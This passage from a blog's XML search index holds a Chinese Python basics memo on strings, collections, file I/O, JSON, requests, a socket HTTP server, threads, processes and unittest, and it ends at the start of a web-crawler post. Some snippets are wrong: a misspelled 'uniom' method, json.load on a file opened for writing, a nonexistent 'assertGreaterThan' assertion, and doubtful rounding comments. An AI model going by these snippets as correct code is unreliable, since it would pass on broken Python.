      <tags>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title>Python基础篇</title>
    <url>/2021/01/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E5%88%86%E7%B1%BB-%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/Python%E5%9F%BA%E7%A1%80%E7%AF%87/</url>
    <content><![CDATA[<h2 id="输入输出"><a class="header-anchor" href="#输入输出"></a>输入输出</h2>
<p><strong>输出</strong></p>
<pre><code class="hljs python">print(<span class="hljs-string">'%d,%d'</span>%(i,j),end=<span class="hljs-string">""</span>) <span class="hljs-comment">## print格式化字符串</span>
param = <span class="hljs-string">'hello'</span>
print(<span class="hljs-string">f'<span class="hljs-subst">&#123;param&#125;</span>'</span>) <span class="hljs-comment">## f字符串输出参数</span>

<span class="hljs-comment">## 浮点数保留精度</span>
a = <span class="hljs-number">2.345</span>
print(<span class="hljs-string">'%.2f'</span>%a) <span class="hljs-comment">## 2.35 ,四舍五入</span>
print(round(a,<span class="hljs-number">2</span>)) <span class="hljs-comment">## 2.34 ，五舍六入</span></code></pre>
<p><strong>输入</strong></p>
<pre><code class="hljs python">a = input(<span class="hljs-string">"input a number!\n"</span>)</code></pre>
<h2 id="常用字符串函数"><a class="header-anchor" href="#常用字符串函数"></a>常用字符串函数</h2>
<pre><code class="hljs python"><span class="hljs-comment">## 1.字母处理：</span>
.upper()    <span class="hljs-comment">## 全部大写</span>
.lower()    <span class="hljs-comment">## 全部小写</span>
.swapcase()    <span class="hljs-comment">## 大小写互换</span>
.capitalize()    <span class="hljs-comment">## 首字母大写，其余小写</span>
.title()    <span class="hljs-comment">## 首字母大写</span>

<span class="hljs-comment">## 2.格式化相关</span>
.ljust(width)     <span class="hljs-comment">## 获取固定长度，左对齐，右边不够用空格补齐</span>
.rjust(width)     <span class="hljs-comment">## 获取固定长度，右对齐，左边不够用空格补齐</span>
.center(width)  <span class="hljs-comment">## 获取固定长度，中间对齐，两边不够用空格补齐</span>
.zfill(width)      <span class="hljs-comment">## 获取固定长度，右对齐，左边不足用0补齐</span>

<span class="hljs-comment">## 3.字符串搜索相关</span>
.find()    <span class="hljs-comment">## 搜索指定字符串，找到则返回对应下标，没有则返回-1</span>
.index()    <span class="hljs-comment">## 同上，但是找不到会报错</span>
.rfind()    <span class="hljs-comment">## 从右边开始查找</span>
.count()    <span class="hljs-comment">## 统计指定的字符串出现的次数</span>

<span class="hljs-comment">## 4.字符串处理</span>
.split(<span class="hljs-string">"分割符(串)"</span>,[分割次数])	<span class="hljs-comment">## 分割字符串，得到一个子串列表</span>
.replace(<span class="hljs-string">"原子串"</span>,<span class="hljs-string">"新子串"</span>)	<span class="hljs-comment">## 子串替换</span></code></pre>
<h2 id="常用数据结构"><a class="header-anchor" href="#常用数据结构"></a>常用数据结构</h2>
<p><strong>list-列表</strong></p>
<pre><code class="hljs python">a = []
a.append(<span class="hljs-string">'a'</span>)	<span class="hljs-comment">#在列表最后加入一个元素'a'</span>
a.pop(<span class="hljs-number">0</span>)		<span class="hljs-comment">#删除列表中索引为0的元素</span>
a.insert(<span class="hljs-number">0</span>,<span class="hljs-string">'b'</span>)	<span class="hljs-comment">#在列表索引为0的位置插入元素'b',原本该位置及以后的元素后移一位</span>
a.index(<span class="hljs-string">'b'</span>)	<span class="hljs-comment">#返回元素'b'在列表中第一次出现的位置</span>
a.count(<span class="hljs-string">'b'</span>)	<span class="hljs-comment">#元素'b'在列表中出现的次数</span>
a.__len__()		<span class="hljs-comment">#返回列表的长度</span></code></pre>
<p><strong>tuple-元祖</strong></p>
<pre><code class="hljs python"><span class="hljs-comment">## 元组和列表的区别是：元组中的元素不可变；共同点是都可以使用“[]”进行取值</span>
a = (<span class="hljs-string">'a'</span>,<span class="hljs-string">'b'</span>,<span class="hljs-string">'c'</span>)	<span class="hljs-comment">## 创建元组</span>
b = a[<span class="hljs-number">2</span>]		<span class="hljs-comment">## ‘c’</span></code></pre>
<p><strong>dict-字典</strong></p>
<pre><code class="hljs python">dict1 = &#123;&#125; <span class="hljs-comment">## 创建dict</span>
dict1[<span class="hljs-string">'a'</span>] = <span class="hljs-number">100</span> <span class="hljs-comment">## 添加元素</span>
key_list = list(i.keys()) <span class="hljs-comment">## 获取key列表</span>
<span class="hljs-keyword">del</span> dict1 <span class="hljs-comment">## 清空dict</span>
<span class="hljs-keyword">del</span> dict1[<span class="hljs-string">'a'</span>] <span class="hljs-comment">## 删除键值对 ———— 'a':100</span></code></pre>
<p><strong>set-集合</strong></p>
<pre><code class="hljs python">set1 = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>&#125; <span class="hljs-comment">## 创建set1</span>
set1.add(<span class="hljs-number">3</span>) <span class="hljs-comment">## 新增元素，set1为 &#123;1,2,3&#125;</span>
set1.add(<span class="hljs-number">2</span>) <span class="hljs-comment">## 添加set中已存在的元素，不改变set，仍为 &#123;1,2,3&#125;</span>
set1.add([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>]) <span class="hljs-comment">## 报错，不可add可变对象</span>
set1.remove(<span class="hljs-number">1</span>) <span class="hljs-comment">## 从set1中删去元素 1，set1变为 &#123;2,3&#125;</span>
set1.remove(<span class="hljs-number">4</span>) <span class="hljs-comment">## 从set1中删去元素 4，报错，因为set1中不存在元素 4</span>
set1.discard(<span class="hljs-number">3</span>) <span class="hljs-comment">## 从set1中删去元素 3，set1变为 &#123;2&#125;</span>
set1.discard(<span class="hljs-number">5</span>) <span class="hljs-comment">## 从set1中删去元素 5，set1中不存在元素5，set1仍为 &#123;2&#125;，不报错</span>

set2 = &#123;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125; <span class="hljs-comment">## 创建set2</span>
set3 = set2.uniom(set1) <span class="hljs-comment">## 并集</span>
set3 = set2.intersection(set1) <span class="hljs-comment">## 交集</span>
set3 = set2.difference(set1) <span class="hljs-comment">## 差集</span></code></pre>
<h2 id="类型转换函数"><a class="header-anchor" href="#类型转换函数"></a>类型转换函数</h2>
<pre><code class="hljs python">bool()		<span class="hljs-comment">## 根据传入的参数的逻辑值创建一个新的布尔值</span>
int()		<span class="hljs-comment">## 根据传入的参数创建一个新的整数</span>
float()		<span class="hljs-comment">## 根据传入的参数创建一个新的浮点数</span>

bin()		<span class="hljs-comment">## 将整数转换成2进制字符串</span>
oct()		<span class="hljs-comment">## 将整数转化成8进制数字符串</span>
hex()		<span class="hljs-comment">## 将整数转换成16进制字符串</span>

ord()		<span class="hljs-comment">## 返回Unicode字符对应的整数</span>
chr()		<span class="hljs-comment">## 返回整数所对应的Unicode字符</span>
str()		<span class="hljs-comment">## 返回一个对象的字符串表现形式</span>

tuple()		<span class="hljs-comment">## 根据传入的参数创建一个新的元组</span>
list()		<span class="hljs-comment">## 根据传入的参数创建一个新的列表</span>
dict()		<span class="hljs-comment">## 根据传入的参数创建一个新的字典</span>
set()		<span class="hljs-comment">## 根据传入的参数创建一个新的集合</span></code></pre>
<h2 id="文件操作"><a class="header-anchor" href="#文件操作"></a>文件操作</h2>
<h3 id="文件读写"><a class="header-anchor" href="#文件读写"></a>文件读写</h3>
<p>文件读取和写入的常规步骤如下</p>
<pre><code class="hljs python">file_path = <span class="hljs-string">'./test.conf'</span> <span class="hljs-comment"># 要打开的文件路径，可以使用绝对路径或相对路径</span>
file1 = open(file_path,<span class="hljs-string">'r'</span>) <span class="hljs-comment"># 以读取模式打开文件，获取文件句柄并赋值给 file1</span>
content = file1.read() <span class="hljs-comment"># 读取 test.conf 中的所有内容，记录在 content 中</span>
file1.close() <span class="hljs-comment"># 关闭文件，防止资源浪费</span>
file_path = <span class="hljs-string">'/etc/test.conf'</span> 
file2 = open(file_path,<span class="hljs-string">'w'</span>) <span class="hljs-comment"># 以写入模式打开文件，获取文件句柄并赋值给 file2</span>
file2.write(content) <span class="hljs-comment"># 向 /etc/test.conf 中写入 content 的内容</span>
file2.close() <span class="hljs-comment">#关闭文件</span></code></pre>
<p>open()函数用于打开一个文件，并返回一个文件对象</p>
<pre><code class="hljs python">f = open(<span class="hljs-string">'lalala.txt'</span>) <span class="hljs-comment"># 默认以只读模式打开文件</span>
f = open(<span class="hljs-string">'lalala.txt'</span>,<span class="hljs-string">'w'</span>) <span class="hljs-comment"># 以只写模式打开文件</span>
f = open(<span class="hljs-string">'lalala.txt'</span>,<span class="hljs-string">'r'</span>,encoding=<span class="hljs-string">'UTF-8'</span>) <span class="hljs-comment"># 以只读模式、UTF-8编码打开文件</span>
<span class="hljs-keyword">with</span> open(<span class="hljs-string">'lalala.txt'</span>) <span class="hljs-keyword">as</span> f: <span class="hljs-comment"># 代码块结束时自动调用 f.close()</span>
    c = f.read()</code></pre>
<p>文件对象的常用方法有</p>
<pre><code class="hljs python">file.read() <span class="hljs-comment"># 读取全部文件内容</span>
file.readline() <span class="hljs-comment"># 读取文件中的一行</span>
file.readlines([行数]) <span class="hljs-comment"># 读取文件中的多行，若不指定行数则全部读取</span>
file.write() <span class="hljs-comment"># 文件写入</span>
f.seek(偏移量,[起始位置]) <span class="hljs-comment"># 用来移动文件指针，偏移量: 单位为字节，可正可负；起始位置: 0 - 文件头, 默认值; 1 - 当前位置; 2 - 文件尾</span>
file.close() <span class="hljs-comment"># 文件关闭</span></code></pre>
<p>mode如下表所示</p>
<table>
<thead>
<tr>
<th style="text-align:center">字符</th>
<th style="text-align:center">含义</th>
<th>文件不存在时</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>r</code></td>
<td style="text-align:center">打开文件以阅读（默认模式）</td>
<td>报错</td>
</tr>
<tr>
<td style="text-align:center"><code>w</code></td>
<td style="text-align:center">打开文件以写入，覆盖原文件</td>
<td>创建</td>
</tr>
<tr>
<td style="text-align:center"><code>a</code></td>
<td style="text-align:center">打开写入，追加到文件末尾</td>
<td>创建</td>
</tr>
<tr>
<td style="text-align:center"><code>b</code></td>
<td style="text-align:center">二进制模式，与<code>r</code> <code>w</code>一起使用</td>
<td></td>
</tr>
<tr>
<td style="text-align:center"><code>t</code></td>
<td style="text-align:center">文本模式（默认就有，不用自己写）</td>
<td></td>
</tr>
<tr>
<td style="text-align:center"><code>+</code></td>
<td style="text-align:center">打开文件进行更新（读取和写入）</td>
<td></td>
</tr>
</tbody>
</table>
<h3 id="目录操作"><a class="header-anchor" href="#目录操作"></a>目录操作</h3>
<pre><code class="hljs python">__file__ <span class="hljs-comment">## 当前文件的路径（可能为相对路径，取决于python文件执行的方式）</span>
os.path.realpath(__file__) <span class="hljs-comment">## 获取当前文件的绝对路径</span>
os.path.dirname(os.path.realpath(__file__)) <span class="hljs-comment">## 获取当前文件所在目录（不包含文件名）</span>
os.path.join(path,<span class="hljs-string">"test.yaml"</span>) <span class="hljs-comment">## 由目录和文件名结合成为新的文件绝对路径</span></code></pre>
<h2 id="import-的使用"><a class="header-anchor" href="#import-的使用"></a>import 的使用</h2>
<p>​	一个<code>.py</code>文件可以看作是一个模块（module），使用<code>import</code>命令将一个模块引入当前python文件，则可以在当前文件使用引入模块中定义的变量，函数等。</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> module_name	<span class="hljs-comment">#module_name.py文件可以在sys.path中或者当前文件所在文件夹中</span>
<span class="hljs-keyword">import</span> module_name <span class="hljs-keyword">as</span> mod <span class="hljs-comment">#引入module_name并设置别名为 mod</span>
<span class="hljs-keyword">from</span> module_name <span class="hljs-keyword">import</span> xxx		<span class="hljs-comment">#从module_name.py中引入xxx变量或者xxx函数</span>
<span class="hljs-comment">#从系统目录或当前目录的package_name包里找到module_name.py并引入</span>
<span class="hljs-keyword">from</span> package_name <span class="hljs-keyword">import</span> module_name</code></pre>
<p>一个包（package）是模块或包的集合，其本质是一个含有<code>__init__.py</code>的文件夹，且<code>__init__.py</code>可以为空。</p>
<h2 id="序列化和反序列化"><a class="header-anchor" href="#序列化和反序列化"></a>序列化和反序列化</h2>
<p>序列化</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> json

dict1 = &#123;<span class="hljs-string">"name"</span>:<span class="hljs-string">"Dawnyh"</span>, <span class="hljs-string">"age"</span>:<span class="hljs-number">20</span>, <span class="hljs-string">"id"</span>:<span class="hljs-string">"2333"</span>&#125;
json_str = json.dumps(dict1) <span class="hljs-comment">## 将dict1转为json格式的字符串</span>
dict2 = json.loads(json_str) <span class="hljs-comment">## 把字符串反序列化为一个新的dict</span>

<span class="hljs-keyword">with</span> open(<span class="hljs-string">"file1.json"</span>,<span class="hljs-string">"w"</span>) <span class="hljs-keyword">as</span> f:
    json.dump(dict1, f) <span class="hljs-comment">## 序列化后保存到文件</span>
<span class="hljs-keyword">with</span> open(<span class="hljs-string">"file1.json"</span>,<span class="hljs-string">"w"</span>) <span class="hljs-keyword">as</span> f:
    dict3 = json.load(f) <span class="hljs-comment">## 从文件反序列化为dict</span></code></pre>
<h2 id="HTTP"><a class="header-anchor" href="#HTTP"></a>HTTP</h2>
<h3 id="发起请求"><a class="header-anchor" href="#发起请求"></a>发起请求</h3>
<p>要在python程序中访问外部网站，可以使用<code>requests</code>模块，这是一个功能强大的http请求工具</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
url = <span class="hljs-string">"http://example.com"</span>
<span class="hljs-comment">#获取响应包</span>
r = requests.get(url)
<span class="hljs-keyword">try</span>:
	<span class="hljs-comment">#判断相应包状态码，若不为200则抛出异常</span>
	r.raise_for_status()
	<span class="hljs-comment">#设置编码方式为从内容中分析出的编码方式</span>
	r.encoding = r.apparent_encoding
<span class="hljs-keyword">except</span>:
	print(<span class="hljs-string">"error!"</span>)

<span class="hljs-comment">#获取响应包内容</span>
print(r.text)</code></pre>
<h3 id="处理请求"><a class="header-anchor" href="#处理请求"></a>处理请求</h3>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> socket

HOST,PORT = <span class="hljs-string">'0.0.0.0'</span>,<span class="hljs-number">18080</span>

<span class="hljs-comment">## 创建socket，AF_INET表示使用IPv4协议，SOCK_STREAM表示采用TCP协议通信</span>
listen_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
<span class="hljs-comment">## SO_REUSEADDR允许单个进程捆绑同一端口到多个套接字上</span>
listen_socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,<span class="hljs-number">1</span>)
listen_socket.bind((HOST,PORT)) <span class="hljs-comment">## 绑定IP和端口</span>
listen_socket.listen(<span class="hljs-number">1</span>)
print(<span class="hljs-string">'Serving HTTP on port %s ...'</span> % PORT)
<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
	client_connection,client_address = listen_socket.accept()
	request = client_connection.recv(<span class="hljs-number">1024</span>)
	<span class="hljs-comment">## 输出请求内容</span>
    print(request)
	
    <span class="hljs-comment">## 返回响应内容</span>
	http_response = <span class="hljs-string">b"""</span>
<span class="hljs-string">	HTTP/1.1 200 OK\r\n</span>
<span class="hljs-string">	\r\n</span>
<span class="hljs-string">	Hello,world!</span>
<span class="hljs-string">	"""</span>
	client_connection.send(http_response)
	client_connection.close()</code></pre>
<h2 id="函数装饰器"><a class="header-anchor" href="#函数装饰器"></a>函数装饰器</h2>
<p>在python中，一切皆对象，包括函数。所以我们可以把函数赋值给变量，也可以把函数作为另一个函数的参数或者返回值，这就是python函数装饰器的基础。python中的装饰器也是一个函数，这个函数的作用是为其他函数增加一些流程或者说行为，也就是装饰。</p>
<p>python函数装饰器常用于权限认证以及记录日志</p>
<h2 id="并发"><a class="header-anchor" href="#并发"></a>并发</h2>
<h3 id="多进程"><a class="header-anchor" href="#多进程"></a>多进程</h3>
<p>考虑到跨平台编程的需求，使用multiprocessing模块中的Process类进行子进程的创建和启动</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process
<span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> getpid
<span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint
<span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> time, sleep


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">download_task</span><span class="hljs-params">(filename)</span>:</span>
    print(<span class="hljs-string">'启动下载进程，进程号[%d].'</span> % getpid())
    print(<span class="hljs-string">'开始下载%s...'</span> % filename)
    time_to_download = randint(<span class="hljs-number">5</span>, <span class="hljs-number">10</span>) <span class="hljs-comment">## 5到10之间的随机整数</span>
    sleep(time_to_download)
    print(<span class="hljs-string">'%s下载完成! 耗费了%d秒'</span> % (filename, time_to_download))


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>
    start = time()
    <span class="hljs-comment">## 创建进程对象p1，执行函数download_task，传入参数('Python从入门到住院.pdf', )</span>
    p1 = Process(target=download_task, args=(<span class="hljs-string">'Python从入门到住院.pdf'</span>, ))
    p1.start() <span class="hljs-comment">## 启动进程</span>
    p2 = Process(target=download_task, args=(<span class="hljs-string">'Peking Hot.avi'</span>, ))
    p2.start()
    p1.join() <span class="hljs-comment">## 等待进程执行结束</span>
    p2.join()
    end = time()
    print(<span class="hljs-string">'总共耗费了%.2f秒.'</span> % (end - start))


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    main()</code></pre>
<p>在多个进程进行同步时，则需要用到进程间通信</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process,Queue

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">print_pingpong</span><span class="hljs-params">(queue,str1)</span>:</span>
	<span class="hljs-keyword">while</span> queue.qsize() &lt; <span class="hljs-number">10</span>: <span class="hljs-comment">## 判断队列中的元素个数</span>
		print(queue.qsize())
		queue.put(<span class="hljs-number">1</span>) <span class="hljs-comment">## 将元素入队列</span>
		<span class="hljs-comment">## print(str1)</span>
		
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main1</span><span class="hljs-params">()</span>:</span>
	queue = Queue(<span class="hljs-number">10</span>) <span class="hljs-comment">## 创建一个队列</span>
    <span class="hljs-comment">## 把队列作为参数传入</span>
	p1 = Process(target=print_pingpong, args=(queue,<span class="hljs-string">'ping'</span>, )) 
	p1.start()
	p2 = Process(target=print_pingpong, args=(queue,<span class="hljs-string">'pong'</span>, ))
	p2.start()
	p1.join()
	p2.join()

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    main1()</code></pre>
<h3 id="多线程"><a class="header-anchor" href="#多线程"></a>多线程</h3>
<p>使用<code>threading</code>模块创建多线程程序，创建线程的方式有从函数启动和从类启动</p>
<p>从函数启动的示例代码如下：</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> time
<span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sub_task</span><span class="hljs-params">(name:str)</span>:</span>
    print(name)
    time.sleep(<span class="hljs-number">2</span>)
    print(<span class="hljs-string">f'<span class="hljs-subst">&#123;name&#125;</span> done!'</span>)


t1 = Thread(target=sub_task, args=(<span class="hljs-string">'bob'</span>,))
t2 = Thread(target=sub_task, args=(<span class="hljs-string">'otto'</span>,))

t1.start()
t2.start()

t1.join()
t2.join()

print(<span class="hljs-string">'all done!'</span>)</code></pre>
<p>从类启动的示例代码如下：</p>
<pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span>

<span class="hljs-comment">## 转自：https://www.runoob.com/python3/python3-multithreading.html</span>

<span class="hljs-keyword">import</span> threading
<span class="hljs-keyword">import</span> time

exitFlag = <span class="hljs-number">0</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">myThread</span> <span class="hljs-params">(threading.Thread)</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, threadID, name, delay)</span>:</span>
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.delay = delay
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span><span class="hljs-params">(self)</span>:</span>
        <span class="hljs-keyword">print</span> (<span class="hljs-string">"开始线程："</span> + self.name)
        print_time(self.name, self.delay, <span class="hljs-number">5</span>)
        <span class="hljs-keyword">print</span> (<span class="hljs-string">"退出线程："</span> + self.name)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">print_time</span><span class="hljs-params">(threadName, delay, counter)</span>:</span>
    <span class="hljs-keyword">while</span> counter:
        <span class="hljs-keyword">if</span> exitFlag:
            threadName.exit()
        time.sleep(delay)
        <span class="hljs-keyword">print</span> (<span class="hljs-string">"%s: %s"</span> % (threadName, time.ctime(time.time())))
        counter -= <span class="hljs-number">1</span>

<span class="hljs-comment">## 创建新线程</span>
thread1 = myThread(<span class="hljs-number">1</span>, <span class="hljs-string">"Thread-1"</span>, <span class="hljs-number">1</span>)
thread2 = myThread(<span class="hljs-number">2</span>, <span class="hljs-string">"Thread-2"</span>, <span class="hljs-number">2</span>)

<span class="hljs-comment">## 开启新线程</span>
thread1.start()
thread2.start()
thread1.join()
thread2.join()
<span class="hljs-keyword">print</span> (<span class="hljs-string">"退出主线程"</span>)</code></pre>
<h3 id="协程"><a class="header-anchor" href="#协程"></a>协程</h3>
<p>使用<code>async</code>和<code>await</code>关键字进行声明</p>
<p>例如：</p>
<pre><code class="hljs python"><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_burgers</span><span class="hljs-params">(number: int)</span>:</span><span class="hljs-comment">## 告诉python这个函数支持异步执行</span>
  <span class="hljs-comment">## Do some asynchronous stuff to create the burgers</span>
  <span class="hljs-keyword">return</span> burgers

burgers = <span class="hljs-keyword">await</span> get_burgers(<span class="hljs-number">2</span>) <span class="hljs-comment">## 告诉python可以挂起这一步的执行先去执行别的操作</span></code></pre>
<p>ps: <code>await</code>必须在使用<code>async def</code>声明的函数中使用</p>
<h2 id="单元测试"><a class="header-anchor" href="#单元测试"></a>单元测试</h2>
<p>对函数进行测试，给他一个输入，验证他的输出是否符合预期</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> unittest <span class="hljs-comment">## 导入单元测试模块</span>

<span class="hljs-comment">## 要测试的函数</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">my_div</span><span class="hljs-params">(a, b)</span>:</span>
    <span class="hljs-keyword">return</span> a / b

<span class="hljs-comment">## 测试类</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestFunc</span><span class="hljs-params">(unittest.TestCase)</span>:</span>
    <span class="hljs-comment">## 测试用例</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_div</span><span class="hljs-params">(self)</span>:</span>
        self.assertEqual(<span class="hljs-number">2</span>, my_div(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)) <span class="hljs-comment">## 判断结果是否等于</span>
        self.assertEqual(<span class="hljs-number">-2</span>, my_div(<span class="hljs-number">2</span>,<span class="hljs-number">-1</span>))
        
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_div2</span><span class="hljs-params">(self)</span>:</span> <span class="hljs-comment">## 可以同时测试多个函数</span>
        <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    unittest.main()</code></pre>
<p>在 unittest 的模块中，还有特别丰富的测试方式，常用如下：</p>
<table>
<thead>
<tr>
<th style="text-align:left">assert</th>
<th style="text-align:left">含义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">assertEqual(a, b)</td>
<td style="text-align:left"><code>a == b</code></td>
</tr>
<tr>
<td style="text-align:left">assertNotEqual(a, b)</td>
<td style="text-align:left"><code>a != b</code></td>
</tr>
<tr>
<td style="text-align:left">assertTrue(condition)</td>
<td style="text-align:left">condition 是不是 True</td>
</tr>
<tr>
<td style="text-align:left">assertFalse(condition)</td>
<td style="text-align:left">condition 是不是 False</td>
</tr>
<tr>
<td style="text-align:left">assertGreater(a, b)</td>
<td style="text-align:left"><code>a &gt; b</code></td>
</tr>
<tr>
<td style="text-align:left">assertGreaterThan(a, b)</td>
<td style="text-align:left"><code>a &gt;= b</code></td>
</tr>
<tr>
<td style="text-align:left">assertLess(a, b)</td>
<td style="text-align:left"><code>a &lt; b</code></td>
</tr>
<tr>
<td style="text-align:left">assertLessEqual(a, b)</td>
<td style="text-align:left"><code>a &lt;= b</code></td>
</tr>
<tr>
<td style="text-align:left">assertIs(a, b)</td>
<td style="text-align:left"><code>a is b</code>，a 和 b 是不是同一对象</td>
</tr>
<tr>
<td style="text-align:left">assertIsNot(a, b)</td>
<td style="text-align:left"><code>a is not b</code>，a 和 b 是不是不同对象</td>
</tr>
<tr>
<td style="text-align:left">assertIsNone(a)</td>
<td style="text-align:left"><code>a is None</code>，a 是不是 None</td>
</tr>
<tr>
<td style="text-align:left">assertIsNotNone(a)</td>
<td style="text-align:left"><code>a is not None</code>，a 不是 None？</td>
</tr>
<tr>
<td style="text-align:left">assertIn(a, b)</td>
<td style="text-align:left"><code>a in b</code>, a 在 b 里面？</td>
</tr>
<tr>
<td style="text-align:left">assertNotIn(a, b)</td>
<td style="text-align:left"><code>a not in b</code>，a 不在 b 里？</td>
</tr>
<tr>
<td style="text-align:left">assertRaises(err)</td>
<td style="text-align:left">通常和 with 一起用，判断 with 里的功能是否会报错</td>
</tr>
</tbody>
</table>
<h2 id="一些特性"><a class="header-anchor" href="#一些特性"></a>一些特性</h2>
<p><strong>问号表达式在python中的实现</strong></p>
<p>在python中，and 和 or 运算符并不是返回bool值，而是返回表达式中使结果确定的那个值。例如 5 and 1 的结果是1，因为 and 运算符只有在两边都不为 0 的时候运算结果才不为 0，从左往右判断，5不为0满足条件，1不为0确定了表达式结果不为0，因此表达式的结果为1。又比如表达式 2 or 1 的结果为 2 ，因为 or 运算符只需要表达式两边有一方不为0即表达式结果不为0，因此表达式判断到 2 的时候，发现2不为0，那么表达式结果就确定了（True），因此把 2 作为返回值。</p>
<p>利用这个特性，我们就可以实现问号表达式了</p>
<pre><code class="hljs python">a = int(input(<span class="hljs-string">"输入一个大于0的整数："</span>))
b = a%<span class="hljs-number">2</span>==<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-string">"奇数"</span> <span class="hljs-keyword">or</span> <span class="hljs-string">"偶数"</span>
print(<span class="hljs-string">f'<span class="hljs-subst">&#123;a&#125;</span>为<span class="hljs-subst">&#123;b&#125;</span>'</span>)</code></pre>
<p>运行结果如下：</p>
<p><img src="/2021/01/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E5%88%86%E7%B1%BB-%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/Python%E5%9F%BA%E7%A1%80%E7%AF%87/image-20230103091215036.png" class="lazy" data-srcset="/2021/01/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E5%88%86%E7%B1%BB-%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/Python%E5%9F%BA%E7%A1%80%E7%AF%87/image-20230103091215036.png" srcset="/images/loadingImage.gif" alt="image-20230103091215036"></p>
<h2 id="python3-VS-python2"><a class="header-anchor" href="#python3-VS-python2"></a>python3  VS  python2</h2>
<p><strong>在编码上的区别</strong></p>
<p>在 Python2 中，字符串有两个类型，一个是 unicode，一个是 str，前者表示文本字符串，后者表示字节序列，不过两者并没有明显的界限，开发时容易出现编码错误。在 Python3 中对两者做了严格区分，分别用 str 表示字符串，bytes 表示字节序列，任何需要写入文本或者网络传输的数据都只接收字节序列，这就从源头上阻止了编码错误的问题。</p>
<p>要指定一个字符串为 bytes 类型，有三种方法：</p>
<ul>
<li>字符串前（引号前）加上前缀<code>b</code> ，但这种方法仅支持 ASCII 字符串；</li>
<li>使用<code>encode()</code>函数</li>
<li>使用<code>bytes()</code>构造函数</li>
</ul>
<pre><code class="hljs python">str_a = <span class="hljs-string">b"Hello World!"</span>				<span class="hljs-comment">#正确</span>
str_b = <span class="hljs-string">b"一个字符串。"</span>				<span class="hljs-comment">#错误</span>
str_c = <span class="hljs-string">"一个字符串"</span>.encode(<span class="hljs-string">'utf-8'</span>)	<span class="hljs-comment">#正确，不指定编码方式也默认以utf-8编码</span>
str_d = bytes(<span class="hljs-string">"abcde"</span>,<span class="hljs-string">'utf-8'</span>)		<span class="hljs-comment">#正确，第二个参数不可省略</span></code></pre>
<p>C语言的 printf 函数不支持 Unicode 字符串的输出。在 python3 中想要调用C语言的printf函数，需要将参数由 Unicode 字符串转化为字节序列</p>
]]></content>
      <categories>
        <category>计算机基础</category>
      </categories>
      <tags>
        <tag>备忘录</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python实战篇</title>
    <url>/2021/01/31/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E5%88%86%E7%B1%BB-%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/Python%E5%AE%9E%E6%88%98%E7%AF%87/</url>
    <content><![CDATA[<h2 id="Python爬虫"><a class="header-anchor" href="#Python爬虫"></a>Python爬虫</h2>
<p>从<a href="http://www.csu.edu.cn/index/xndh.htm">中南大学校内导航</a>中爬取校内网站名称和对应的链接。</p>
<p>爬虫程序主要分为html页面获取和数据提取两个部分，接下来分别说明其实现方法。</p>
<h3 id="获取网页"><a class="header-anchor" href="#获取网页"></a>获取网页</h3>
<p>使用requests库来获取网站的html页面</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
